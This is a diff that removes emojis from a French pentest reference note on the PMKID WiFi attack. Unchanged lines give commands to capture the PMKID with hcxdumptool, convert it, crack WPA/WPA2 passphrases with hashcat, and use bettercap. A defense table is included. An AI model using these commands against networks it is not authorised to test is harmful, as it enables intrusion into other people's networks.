@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 📶 Attaques WiFi — PMKID
+# Attaques WiFi — PMKID
 
 > [!info] **En 1 phrase**
 > Le **PMKID** est une valeur calculée par le point d'accès (WPA/WPA2) et exposée dans le message RSN —
@@ -21,7 +21,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -32,14 +32,14 @@ flowchart LR
     E --> F[Passphrase]
 ```
 
-> [!info] 💡 **Pourquoi PMKID ?**
+> [!info] **Pourquoi PMKID ?**
 > - Pas besoin de **client connecté** (contrairement au handshake 4-way).
 > - Pas besoin de **deauth** (moins bruyant).
 > - Fonctionne sur les AP **WPA/WPA2** qui supportent le PMKID (envoyé dans l'association).
 
 ---
 
-## 🎯 Capture du PMKID
+## Capture du PMKID
 
 ```bash
 INTERFACE=$(ifconfig | grep wlp | cut -d":" -f1)   # mon0
@@ -53,12 +53,12 @@ PMKID=$(sudo hcxdumptool -o test.pcapng -i $INTERFACE --enable_status --filtermo
 echo $PMKID | grep 'FOUND PMKID' &> /dev/null
 ```
 
-> [!warning] ⚠️ **Patience** : sur un canal bruyant, le PMKID peut prendre **plusieurs minutes**.
+> [!warning] **Patience** : sur un canal bruyant, le PMKID peut prendre **plusieurs minutes**.
 > Laisser tourner `hcxdumptool` jusqu'à **10 minutes** avant d'abandonner.
 
 ---
 
-## 🔄 Conversion au format hashcat
+## Conversion au format hashcat
 
 ```bash
 # Conversion simple
@@ -76,7 +76,7 @@ hcxpcaptool -E essidlist -I identitylist -U usernamelist -z test.16800 test.pcap
 
 ---
 
-## 💥 Crack avec hashcat
+## Crack avec hashcat
 
 ```bash
 # Masque (chiffres/lettres) — rapide si passphrase courte
@@ -89,11 +89,11 @@ hashcat -m 16800 -d 1 -w 3 test.16800 rockyou.txt
 hashcat -m 16800 -a 0 -w 3 test.16800 rockyou.txt -r rules/best64.rule
 ```
 
-> [!tip] 💡 **Erreur fréquente** : `CL_PLATFORM_NOT_FOUND_KHR` = pas d'OpenCL/GPU → vérifier les drivers ou forcer le CPU (`--force`).
+> [!tip] **Erreur fréquente** : `CL_PLATFORM_NOT_FOUND_KHR` = pas d'OpenCL/GPU → vérifier les drivers ou forcer le CPU (`--force`).
 
 ---
 
-## 🤖 Variante bettercap
+## Variante bettercap
 
 ```bash
 # Associer à tous les AP (bettercap met l'interface en monitor automatiquement)
@@ -107,7 +107,7 @@ hashcat -m 16800 -a 0 -w 3 test.16800 rockyou.txt -r rules/best64.rule
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -116,14 +116,14 @@ hashcat -m 16800 -a 0 -w 3 test.16800 rockyou.txt -r rules/best64.rule
 | **Désactiver la compatibilité** | Certains AP laissent désactiver l'envoi du PMKID (moins pratique, pas une défense absolue) |
 | **Surveillance** | Les associations répétées et rapprochées sont un signal (WIDS) |
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
 - Le PMKID **ne remplace pas** toujours le handshake : certains AP ne l'envoient pas → revenir à la fiche WPA2.
 - Il peut être **plus lent** que la deauth (association en boucle) — mais **plus furtif**.
 - Le hash 16800 contient **ESSID en clair** → masque ciblé possible.
 - `hcxpcaptool` peut aussi extraire des **handshakes** d'un même pcap (convertir en 22000 pour hashcat).
 
-> [!info] 📚 **Sources**
+> [!info] **Sources**
 > GitHub : [swisskyrepo/HardwareAllTheThings – `docs/protocols/wifi/wifi-wpa.md`](https://github.com/swisskyrepo/HardwareAllTheThings/blob/main/docs/protocols/wifi/wifi-wpa.md) (section PMKID)
 
-➡️ **Liens :** [[Attaques WiFi (WPA2 et PMKID)|📶 Hub WiFi]] · [[Attaques WiFi - WPA2 PSK|🔐 WPA2-PSK]] · [[Attaques WiFi - Préparation & Basiques|🧰 Préparation]] · [[Password Cracking|🔐 Cracking]] · [[Hardware - Pwnagotchi|🤖 Pwnagotchi]] · [[Bibliothèque technique|🏠 Index]]
+**Liens :** [[Attaques WiFi (WPA2 et PMKID)| Hub WiFi]] · [[Attaques WiFi - WPA2 PSK| WPA2-PSK]] · [[Attaques WiFi - Préparation & Basiques| Préparation]] · [[Password Cracking| Cracking]] · [[Hardware - Pwnagotchi| Pwnagotchi]] · [[Bibliothèque technique| Index]]
